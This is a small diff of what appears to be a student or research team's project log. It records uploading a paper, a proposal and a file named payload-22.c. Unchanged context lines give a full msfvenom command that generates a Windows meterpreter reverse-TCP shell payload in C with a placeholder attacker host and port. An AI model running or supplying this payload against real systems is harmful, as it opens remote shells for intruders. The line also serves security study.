@@ -88,7 +88,7 @@ Russell:
       - created GitHub repo and uploaded the research paper as well as our proposal.
       - created and uploaded payload-22.c
 
-  To create a payload (using kali):
+  To create a payload:
             
       $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0\x0C\x0D"
 
